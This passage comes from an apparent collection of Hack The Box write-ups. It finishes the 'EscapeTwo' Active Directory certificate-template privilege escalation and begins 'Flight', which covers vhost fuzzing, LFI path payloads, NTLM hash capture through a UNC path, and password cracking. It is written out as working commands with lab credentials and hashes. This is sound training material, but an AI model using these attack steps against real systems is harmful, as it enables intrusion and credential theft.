'WqSZAF6CysDQbGb3' --continue-on-success\n</code></pre></p> <p>aand we got ourselves a shell! we also see its associated with user ryan, so the creds for future reference are: <pre><code>ryan -&gt; WqSZAF6CysDQbGb3\n</code></pre> lets grab the user flag and move on to the privesc</p> <p>Also, upon seeing the name ryan, only one thing comes to mind (yeah you thought about it too)</p> <p></p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#privesc","title":"Privesc","text":"<p>Now that we have a user's creds (ryan), we can fire up Bloodhound to get a better picture about user ryan</p> <p>first add dc01.sequel.htb in /etc/hosts too <pre><code>echo '10.10.11.51 dc01.sequel.htb' | sudo tee -a /etc/hosts\n</code></pre> then start Bloodhound: <pre><code>sudo neo4j console\nsudo bloodhound-python -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 -ns 10.10.11.51 -c all\n</code></pre></p> <p>From the graph, we can see that ryan has WriteOwner permission towards user CA_SVC, where CA_SVC is the certificate issuer. So</p> <p>{\u00a0ryan\u00a0}-----( WriteOwner )-----&gt;{\u00a0CA_SVC\u00a0}</p> <p>That means, that we can set the owner of CA_SVC to ryan! <pre><code>bloodyAD --host '10.10.11.51' -d 'EscapeTwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'\n</code></pre></p> <p>Lets now give ryan full control <pre><code>impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/\"ryan\":\"WqSZAF6CysDQbGb3\"\n</code></pre></p> <p>We can now obtain shadow creds and the NThash of the ca_svc user: <pre><code>certipy-ad shadow auto -u 'ryan@sequel.htb' -p \"WqSZAF6CysDQbGb3\" -account 'ca_svc' -dc-ip '10.10.11.51'\n</code></pre> and we got the NThash ca_svc : (which will be usefull later on) <pre><code>3b181b914e7a9d5508ea1e20bc2b7fce\n</code></pre></p> <p>Now we can find vulnerable certificate templates, BECAUSE as ryan we are the OWNER of ca_svc which is the certificate issuer/publisher. </p> <p><pre><code>certipy-ad find -vulnerable -u ryan@sequel.htb -p \"WqSZAF6CysDQbGb3\" -dc-ip 10.10.11.51\n</code></pre> From this command, i found this vulnerable cert template: DunderMifflinAuthentication enabled, which allows Domain Admins and Enterprise Admins to request for certificates</p> <p>So the template DunderMifflinAuthentication allows certificate publisher ca_svc (which ryan fully control thanks to above commands) to get a certificate with high privileges using below command: first <pre><code>KRB5CCNAME=$PWD/ca_svc.ccache \n</code></pre> then <pre><code>certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb\n</code></pre></p> <p>when completed successfully, we can obtain the system's auth ticket via kerberos request using ca_svc user's cred hash: <pre><code>certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug\n</code></pre></p> <p>This should download the certificate (administrator_10.pfx) locally, and we can now use it to get the Administrator's hash through it <pre><code>certipy-ad auth -pfx administrator_10.pfx  -domain sequel.htb\n</code></pre></p> <p>great! this will give us the hash, and by using it we can login and grab the root flag <pre><code>evil-winrm -i EscapeTwo.htb -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'\n</code></pre></p> <p>(table down) \u252c\u2500\u252c\u30ce( \u00ba _ \u00ba\u30ce)</p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>"},{"location":"ch3ckm8_HTB_EscapeTwo/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; chose smb service to focus on</li> <li>enumerate smb shares -&gt; found user creds on an xlsx file</li> <li>correlate users with associated service, found that one user (sa) was related with MSSQL and actually is the default admin account that manages MSSQL databases</li> </ol>"},{"location":"ch3ckm8_HTB_EscapeTwo/#foothold_1","title":"Foothold","text":"<ol> <li>connect through MSSQL for that admin account (sa), and since it has admin priviledges through specific commands, i found a way to execute any system command</li> <li>by executing system commands as the MSSQL admin, i inspected the directories and came accross a configuration (.INI) file, which contained cleartext pass for a AD service account! the account was sql_svc and its clear that it is an SQL server service account.</li> <li>tried to login to host with sql_svc account and the pass i found but no luck, then did some password spraying and found that this pass was related to another account, ryan</li> <li>logged in via evil-winrm to host using on user ryan, and grabbed the user flag.</li> </ol>"},{"location":"ch3ckm8_HTB_EscapeTwo/#privesc_1","title":"Privesc","text":"<ol> <li>now that we got foothold, as a user (ryan) we inspect the permissions that user ryan has over other users,i found that he has writeowner permission on user CA_SVC, which means that ryan can set an owner for the CA_SVC account, ALSO! -&gt; CA_SVC is a service account that acts as certificate issuer.</li> <li>so since we control user ryan, but we dont yet control user CA_SVC, according to ryan's available permissions we set ryan (the user we have access) as owner of CA_SVC.</li> <li>then because ryan is now CA_SVC owner we can find vulnerable certificates</li> <li>after finding vulnerable certificate, we can use the certificate publisher (CA_SVC) so ryan, to get a cert with high privileges</li> <li>then we can obtain the system authentication ticket via kerberos request using ca_svc nt hash we obtained earlier</li> <li>from the previous step, we get the administrator certificate (system) (.pfx file) and from that we can obtain the nt hash of administrator</li> <li>using administrator's nt hash we login via evil-winrm to the host and grab the root flag!</li> </ol>"},{"location":"ch3ckm8_HTB_EscapeTwo/#sidenotes","title":"Sidenotes","text":"<p>This was definetely not an \"Easy\" machine... obviously due to the privesc part.. Despite the difficulty mismatch, the privesc part was interesting and is worth a place among my notes.</p> <p>You might have noticed the absence of your favorite narrator, that's because his request for a huge raise  upon seeing the popularity of my previous writeup was rejected.. he will return eventually in the following writeups for the clout (and for my sense humour)</p> <p>WARNING! pwn badge flexing below: https://www.hackthebox.com/achievement/machine/284567/642 </p> <p>Here is your reward for reaching that far (its not what you think) https://www.youtube.com/watch?v=xvFZjo5PgG0</p>"},{"location":"ch3ckm8_HTB_Flight/","title":"Flight","text":""},{"location":"ch3ckm8_HTB_Flight/#intro","title":"Intro","text":"<p>[[windows]] [[NotAssumedBreach]] [[webapp]] [[PortForwarding]] [[Impersonation]] [[DCSync]] [[WinPEAS]] [[Vhosts]] [[OSCPpath]] Tags: #windows #NotAssumedBreach #WebApp #PortForwarding #Impersonation #DCSync #WinPEAS #Vhosts</p> <p>Tools used:</p> <ul> <li>whatweb (banner grabbing)</li> <li>gobuster (domain and subdomain enumeration)</li> <li>smbclient (SMB enumeration)</li> <li>chisel (port forwarding)</li> <li>winpeas (windows privesc)</li> <li>Runas (User impersonation)</li> <li>Rubeus</li> <li>secretsdump (DCSync)</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_Flight/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.148.8 flight.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV flight.htb\n</code></pre> <pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-08-20 11:47 CDT\nNmap scan report for flight.htb (10.129.148.8)\nHost is up (0.0081s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)\n|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: g0 Aviation\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-20 23:48:02Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 6h59m59s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-20T23:48:07\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 53.34 seconds\n</code></pre> <p>Interesting, we see port 80 is open, but first lets look at some other services.</p>"},{"location":"ch3ckm8_HTB_Flight/#rpc-enumeration","title":"RPC enumeration","text":""},{"location":"ch3ckm8_HTB_Flight/#anonymous-logon","title":"Anonymous logon","text":"<pre><code>rpcclient -U \"\" -N flight.htb\n</code></pre> <p>access denied when typing any command</p>"},{"location":"ch3ckm8_HTB_Flight/#smb-enumeration","title":"SMB enumeration","text":""},{"location":"ch3ckm8_HTB_Flight/#anonymous-logon_1","title":"Anonymous logon","text":"<pre><code>smbclient -N -L flight.htb\n</code></pre> <p>no shares found</p>"},{"location":"ch3ckm8_HTB_Flight/#web-app-inspection","title":"Web app inspection","text":"<p>This is the <code>home</code> page</p> <p></p> <p>By clicking on any button and page i see no results or redirects\u2026 thats strange</p>"},{"location":"ch3ckm8_HTB_Flight/#banner-grabbing","title":"Banner grabbing","text":"<pre><code>whatweb flight.htb\n</code></pre> <pre><code>http://flight.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.148.8], JQuery[1.4.2], OpenSSL[1.1.1m], PHP[8.1.1], Script[text/javascript], Title[g0 Aviation\n</code></pre> <p>Okay, we got some information there, but nothing stands out, lets move on with further enumeration of the web app</p>"},{"location":"ch3ckm8_HTB_Flight/#web-app-enumeration","title":"Web app enumeration","text":""},{"location":"ch3ckm8_HTB_Flight/#domain-enumeration","title":"Domain enumeration","text":"<pre><code>gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u flight.htb\n</code></pre> <pre><code>===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://flight.htb\n[+] Method:                  GET\n[+] Threads:                 50\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,html,php\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\nhttp://flight.htb/images               (Status: 301) [Size: 333] [--&gt; http://flight.htb/images/]\nhttp://flight.htb/index.html           (Status: 200) [Size: 7069]\nhttp://flight.htb/.html                (Status: 403) [Size: 299]\nhttp://flight.htb/Images               (Status: 301) [Size: 333] [--&gt; http://flight.htb/Images/]\nhttp://flight.htb/css                  (Status: 301) [Size: 330] [--&gt; http://flight.htb/css/]\nhttp://flight.htb/Index.html           (Status: 200) [Size: 7069]\nhttp://flight.htb/js                   (Status: 301) [Size: 329] [--&gt; http://flight.htb/js/]\nhttp://flight.htb/licenses             (Status: 403) [Size: 418]\nhttp://flight.htb/examples             (Status: 503) [Size: 399]\nhttp://flight.htb/IMAGES               (Status: 301) [Size: 333] [--&gt; http://flight.htb/IMAGES/]\nhttp://flight.htb/%20                  (Status: 403) [Size: 299]\nhttp://flight.htb/INDEX.html           (Status: 200) [Size: 7069]\nhttp://flight.htb/*checkout*           (Status: 403) [Size: 299]\nhttp://flight.htb/*checkout*.txt       (Status: 403) [Size: 299]\nhttp://flight.htb/*checkout*.php       (Status: 403) [Size: 299]\nhttp://flight.htb/*checkout*.html      (Status: 403) [Size: 299]\nhttp://flight.htb/CSS                  (Status: 301) [Size: 330] [--&gt; http://flight.htb/CSS/]\nhttp://flight.htb/JS                   (Status: 301) [Size: 329] [--&gt; http://flight.htb/JS/]\n</code></pre> <p>Nothing too interesting here.. next i will search for subdomains</p>"},{"location":"ch3ckm8_HTB_Flight/#subdomain-enumeration","title":"Subdomain enumeration","text":"<pre><code>gobuster dns -d flight.htb -w /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt -i \u2013wildcard\n</code></pre> <pre><code>===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Domain:     flight.htb\n[+] Threads:    10\n[+] Show IPs:   true\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/seclists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt\n===============================================================\nStarting gobuster in DNS enumeration mode\n===============================================================\nProgress: 49928 / 49929 (100.00%)\n===============================================================\nFinished\n===============================================================\n</code></pre> <p>No subdomains found</p> <p>hm after many hours of searching through the web app, i found nothing. Then by doing some research about web app enumeration i came accross some terms i did not know and havent seen before, like virtual hosts, so lets look if these exist in our occassion:</p>"},{"location":"ch3ckm8_HTB_Flight/#virtual-host-enumeration","title":"Virtual host enumeration","text":""},{"location":"ch3ckm8_HTB_Flight/#what-is-virtual-host","title":"What is virtual host?","text":"<p><code>virtual hosting</code>\u00a0is the ability of web servers to distinguish between multiple websites or applications sharing the same IP address.</p>"},{"location":"ch3ckm8_HTB_Flight/#subdomains-vs-vhosts","title":"Subdomains vs VHosts","text":"<ul> <li>Subdomains are part of a domain name (like <code>blog.example.com</code>) and are managed in DNS. They help organize services (blog, shop, mail, etc.).</li> <li>Virtual Hosts (VHosts) are web server configurations that tell the server how to handle different domain names or subdomains on the same IP.</li> </ul> <p>Even if a domain/subdomain doesn\u2019t exist in DNS, you can still access it by manually mapping it in your hosts file.</p> <p>Attackers and pentesters use VHost fuzzing to find hidden or internal subdomains/VHosts by trying different names against a target IP.</p> Feature Subdomains Virtual Hosts (VHosts) Definition Extensions of a main domain (e.g., <code>blog.example.com</code>). Web server configurations for handling multiple sites on one IP. Where Defined DNS system (domain records). Web server (Apache, Nginx, IIS, etc.). Purpose Organize services/sections of a website. Allow hosting of multiple websites/apps on one server. Dependency Requires a DNS record (unless added manually in hosts file). Requires web server configuration (may or may not have DNS). Examples <code>shop.example.com</code>, <code>mail.example.com</code>. <code>example.com</code> and <code>dev.example.com</code> on same IP but separate configs. Accessibility Public if DNS record exists, private if hidden. Public if DNS points to it, otherwise can still exist internally. Discovery Found via DNS enumeration. Found via VHost fuzzing (testing hostnames on an IP). <p>For example:</p> <ul> <li>A single server with IP <code>192.168.1.10</code></li> <li>Can serve <code>example.com</code> and <code>blog.example.com</code> and <code>shop.com</code> \u2014 all on the same machine.</li> </ul> <p>Lets perform vhost enumeration using gobuster</p> <pre><code>gobuster vhost -u http://flight.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --append-domain\n</code></pre> <pre><code>===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:             http://flight.htb\n[+] Method:          GET\n[+] Threads:         10\n[+] Wordlist:        /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] User Agent:      gobuster/3.6\n[+] Timeout:         10s\n[+] Append Domain:   true\n===============================================================\nStarting gobuster in VHOST enumeration mode\n===============================================================\nFound: '.flight.htb Status: 400 [Size: 326]\nFound: school.flight.htb Status: 200 [Size: 3996]\nFound: %20.flight.htb Status: 400 [Size: 326]\nFound: $FILE.flight.htb Status: 400 [Size: 326]\nFound: $file.flight.htb Status: 400 [Size: 326]\nFound: *checkout*.flight.htb Status: 400 [Size: 326]\nFound: *docroot*.flight.htb Status: 400 [Size: 326]\nFound: School.flight.htb Status: 200 [Size: 3996]\n</code></pre> <p>interesting, it has indeed found virtual hosts, specifically the one with status 200:</p> <pre><code>Found: school.flight.htb Status: 200 [Size: 3996]\n</code></pre> <p>But what to do with it? Well, since we found this one, lets add it on etc hosts:</p> <pre><code>sudo sh -c \"echo '10.129.148.8 school.flight.htb' &gt;&gt; /etc/hosts\"\n</code></pre> <p>And then navigate there on our browser:</p> <p></p> <p>Just like the homepage, nothing is clickable here and no redirects were found by pressing buttons/links.. hm how to move forward here?</p> <p>First, we could try finding information about the website\u2019s tech stack (versions etc)</p>"},{"location":"ch3ckm8_HTB_Flight/#banner-grabbing_1","title":"Banner grabbing","text":"<pre><code>whatweb school.flight.htb\n</code></pre> <pre><code>http://school.flight.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1], IP[10.129.228.120], OpenSSL[1.1.1m], PHP[8.1.1], Title[Aviation School], X-Powered-By[PHP/8.1.1]\n</code></pre> <p>It seems that this is an apache web server, version <code>2.4.52</code> and also i can see <code>X-Powered-By[PHP/8.1.1]</code> indicating php is involved.</p> <p>The version can also be seen by <code>wappalyzer</code> :</p> <p></p> <p>Before we move on, lets enumerate this one for directories too like we did for <code>flight.htb</code> :</p> <pre><code>gobuster dir -e -t50 -x php,txt,html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u school.flight.htb\n</code></pre> <pre><code>===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://school.flight.htb\n[+] Method:                  GET\n[+] Threads:                 50\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,400,429\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html\n[+] Expanded:                true\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\nhttp://school.flight.htb/.html                (Status: 403) [Size: 306]\nhttp://school.flight.htb/images               (Status: 301) [Size: 347] [--&gt; http://school.flight.htb/images/]\nhttp://school.flight.htb/index.php            (Status: 200) [Size: 3996]\nhttp://school.flight.htb/blog.html            (Status: 200) [Size: 3618]\nhttp://school.flight.htb/home.html            (Status: 200) [Size: 2683]\nhttp://school.flight.htb/about.html           (Status: 200) [Size: 1689]\nhttp://school.flight.htb/Images               (Status: 301) [Size: 347] [--&gt; http://school.flight.htb/Images/]\nhttp://school.flight.htb/Home.html            (Status: 200) [Size: 2683]\nhttp://school.flight.htb/About.html           (Status: 200) [Size: 1689]\nhttp://school.flight.htb/Index.php            (Status: 200) [Size: 3996]\nhttp://school.flight.htb/Blog.html            (Status: 200) [Size: 3618]\nhttp://school.flight.htb/styles               (Status: 301) [Size: 347] [--&gt; http://school.flight.htb/styles/]\nhttp://school.flight.htb/licenses             (Status: 403) [Size: 425]\nhttp://school.flight.htb/examples             (Status: 503) [Size: 406]\nhttp://school.flight.htb/IMAGES               (Status: 301) [Size: 347] [--&gt; http://school.flight.htb/IMAGES/]\nhttp://school.flight.htb/%20                  (Status: 403) [Size: 306]\nhttp://school.flight.htb/INDEX.php            (Status: 200) [Size: 3996]\nhttp://school.flight.htb/*checkout*.html      (Status: 403) [Size: 306]\nhttp://school.flight.htb/*checkout*.txt       (Status: 403) [Size: 306]\nhttp://school.flight.htb/*checkout*.php       (Status: 403) [Size: 306]\nhttp://school.flight.htb/*checkout*           (Status: 403) [Size: 306]\nhttp://school.flight.htb/phpmyadmin           (Status: 403) [Size: 425]\nhttp://school.flight.htb/HOME.html            (Status: 200) [Size: 2683]\nhttp://school.flight.htb/webalizer            (Status: 403) [Size: 425]\nhttp://school.flight.htb/Styles               (Status: 301) [Size: 347] [--&gt; http://school.flight.htb/Styles/]\nhttp://school.flight.htb/*docroot*.txt        (Status: 403) [Size: 306]\nhttp://school.flight.htb/ABOUT.html           (Status: 200) [Size: 1689]\n</code></pre> <p>Okay, found some pages here, what does these tell us tho? lets ty navigating on some of them:</p> <p><code>index.php</code> : actually goes into the home page</p> <p></p> <p><code>/images</code> shows the images and gifs of the page:</p> <p></p> <p>Now sth i did not notice earlier, there are buttons that appear only when i hover upon them:</p> <p><code>Home</code> basically is the home page and does not redirect elsewhere: full url <code>http://school.flight.htb/index.php?view=home.html</code></p> <p></p> <p><code>About us</code> . full url: <code>http://school.flight.htb/index.php?view=about.html</code></p> <p></p> <p>Interesting, this one goes on another page:</p> <p></p> <p>It mentions template, in the lower part of the page:</p> <pre><code>Template details\n\nVersion 4\nWebsite Template details, discussion and updates for this Aviation School template. Website Template design by Free Website Templates. Please feel free to remove some or all the text and links of this page and replace it with your own About content.\n</code></pre> <p>I dont know if this might be a hint, we will keep that in mind for later if needed.</p> <p><code>Blog</code> , full url <code>http://school.flight.htb/index.php?view=blog.html</code></p> <p></p> <p>In this page no redirects where observed, nothing is clickable apart from the navigation bar (Home, About us, Blog)</p>"},{"location":"ch3ckm8_HTB_Flight/#exploiting-the-webapp","title":"Exploiting the WebApp","text":"<p>Alright, we found some more pages, but i mentioned their full url\u2019s on purpose! What do we know about these urls?</p> <p>Well, the urls contain flags/arguments, like <code>?</code> sth, this is called query string, and inside it flags/paramteres are located. Parameters are separated with <code>&amp;</code> like this example below:</p> <pre><code>http://example.com/index.php?view=home&amp;id=5\n</code></pre> <p>So what types of vulnerabilities can be exploited via parameters on the url?</p> <ul> <li>LFI</li> <li>RFI</li> <li>Path traversal</li> </ul>"},{"location":"ch3ckm8_HTB_Flight/#checking-for-lfi","title":"Checking for LFI","text":"<p>Checking some windows system files first, with <code>relative</code> paths:</p> <pre><code>/index.php?view=../../../../windows/win.ini\n/index.php?view=../../../../windows/system32/drivers/etc/hosts\n</code></pre> <p>But no luck, again received Suspicious Activity Blocked</p> <p>Lets try now with <code>absolute</code> paths:</p> <pre><code>http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts\n</code></pre> <p>Nice! this did not get blocked and we received the file\u2019s contents:</p> <p></p> <p>I guess the previous relative paths got blocked because it has detected the <code>../</code> parts.</p> <p>Before moving forwards, we could try doing some fuzzing values for the <code>view</code> paramter here to see if we can get any vaulable files:</p> <pre><code>wfuzz -f ./fuzz-output.csv,csv -c -w ../Common/file_inclusion_windows.txt --hw 89,95 http://school.flight.htb/index.php?view=FUZZ\n</code></pre> <p>Unfortunately, i got nothing interesting from this one\u2026 lets move on</p> <p>Lets try sth else, like php filter tricks to bypass extension checks:</p> <pre><code>/index.php?view=php://filter/convert.base64-encode/resource=index.php\n</code></pre> <p>again blocked\u2026.</p>"},{"location":"ch3ckm8_HTB_Flight/#checking-for-rfi","title":"Checking for RFI","text":"<p>Since we found that LFI exists, the next step would be to check for RFI too.</p> <p>Lets check for UNC paths, this will work if <code>allow_url_include</code> or SMB fetching is enabled, and the app might try to load remote files.</p> <pre><code>http://school.flight.htb/index.php?view=//10.10.14.180/myamazingshare\n</code></pre> <p>we could also try to capture the NTLM hash of the account running the web server by making it authenticate against our SMB share.</p> <p>IMPORTANT!: it did not work with <code>\\</code> it got blocked, it only worked with <code>/</code></p> <p>First start the responder</p> <pre><code>sudo responder -I tun0 -wP\n</code></pre> <p>then hit the previous url on the browser, and receive the response on the responder with the NTLM hash</p> <pre><code>[+] Listening for events...\n\n[SMB] NTLMv2-SSP Client   : 10.129.228.120\n[SMB] NTLMv2-SSP Username : flight\\svc_apache\n[SMB] NTLMv2-SSP Hash     : svc_apache::flight:b3e91d07e8f0b746:04154593360088968E55D50CACE9BDC9:0101000000000000808519825913DC014B2194F5D02C9DC00000000002000800490036003300510001001E00570049004E002D004A00530052004100430032004F004C0030004100500004003400570049004E002D004A00530052004100430032004F004C003000410050002E0049003600330051002E004C004F00430041004C000300140049003600330051002E004C004F00430041004C000500140049003600330051002E004C004F00430041004C0007000800808519825913DC01060004000200000008003000300000000000000000000000003000005108C442C3741020BE0C1669030BA6011CB2E34E998B97B6DD2F82EF286BF89D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100380030000000000000000000\n</code></pre> <p>nice! we got the <code>NTLM</code> hash of <code>svc_apache</code> user, </p>"},{"location":"ch3ckm8_HTB_Flight/#cracking-ntlm-hash","title":"Cracking NTLM hash","text":"<p>unzip the wordlist (on HTB pwnbox its on zip format)</p> <pre><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n</code></pre> <p>next crack it with john the ripper</p> <pre><code>john svc_hash --wordlist=/usr/share/wordlists/rockyou.txt\n</code></pre> <p>it was cracked successfully, and we got the password:</p> <pre><code>Using default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nS@Ss!K@*t13      (svc_apache)     \n1g 0:00:00:04 DONE (2025-08-22 12:06) 0.2136g/s 2278Kp/s 2278Kc/s 2278KC/s SADSAM..S42150461\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <p>lets now see where we can login with those creds:</p> <pre><code>svc_apache\nS@Ss!K@*t13\n</code></pre>"},{"location":"ch3ckm8_HTB_Flight/#checking-where-we-can-login-with-svc_apache-creds","title":"Checking where we can login with svc_apache creds","text":"<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</p> <pre><code>./auto_netexec_bulk_creds_checker.sh flight.htb 'svc_apache' 'S@Ss!K@*t13'\n</code></pre> <pre><code>WINRM       10.129.228.120  5985   G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)\nWINRM       10.129.228.120  5985   G0               [-] flight.htb\\svc_apache:S@Ss!K@*t13\n\n[*] Checking if smb port 445 is open on flight.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         10.129.228.120  445    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 \n\n[*] Checking if ldap port 389 is open on flight.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nLDAP        10.129.228.120  389    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 \n\n[*] Checking if rdp port 3389 is open on flight.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on flight.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.228.120  135    G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb)\nRPC         10.129.228.120  135    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 \n\n[*] Checking if nfs port 2049 is open on flight.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on flight.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on flight.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on flight.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on flight.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> <p>It seems we can login to:  <code>SMB</code> <code>LDAP</code> <code>RPC</code> services, we will now proceed with their enumeration</p>"},{"location":"ch3ckm8_HTB_Flight/#smb-enumeration-as-svc_apache","title":"SMB enumeration as svc_apache","text":"<pre><code>nxc smb sequel.htb  -u 'svc_apache' -p 'S@Ss!K@*t13' --shares\n</code></pre> <pre><code>SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)\nSMB         10.129.228.120  445    G0               [+] flight.htb\\svc_apache:S@Ss!K@*t13 \nSMB         10.129.228.120  445    G0               [*] Enumerated shares\nSMB         10.129.228.120  445    G0               Share           Permissions     Remark\nSMB         10.129.228.120  445    G0               -----           -----------     ------\nSMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin\nSMB         10.129.228.120  445    G0               C$                              Default share\nSMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC\nSMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share \nSMB         10.129.228.120  445    G0               Shared          READ            \nSMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share \nSMB         10.129.228.120  445    G0               Users           READ            \nSMB         10.129.228.120  445    G0               Web             READ\n</code></pre> <p>Interesting, we have <code>READ</code> permission towards some shares that are non default: <code>Web</code> and other ones that seem valuable like <code>Shared</code> <code>Users</code></p> <p>Next we can start navigating through these shares and see what we can find:</p> <pre><code>smbclient //flight.htb/Users -U 'svc_apache%S@Ss!K@*t13'\n</code></pre> <pre><code>smb: \\&gt; ls\n  .                                  DR        0  Thu Sep 22 15:16:56 2022\n  ..                                 DR        0  Thu Sep 22 15:16:56 2022\n  .NET v4.5                           D        0  Thu Sep 22 14:28:03 2022\n  .NET v4.5 Classic                   D        0  Thu Sep 22 14:28:02 2022\n  Administrator                       D        0  Mon Oct 31 13:34:00 2022\n  All Users                       DHSrn        0  Sat Sep 15 02:28:48 2018\n  C.Bum                               D        0  Thu Sep 22 15:08:23 2022\n  Default                           DHR        0  Tue Jul 20 14:20:24 2021\n  Default User                    DHSrn        0  Sat Sep 15 02:28:48 2018\n  desktop.ini                       AHS      174  Sat Sep 15 02:16:48 2018\n  Public                             DR        0  Tue Jul 20 14:23:25 2021\n  svc_apache                     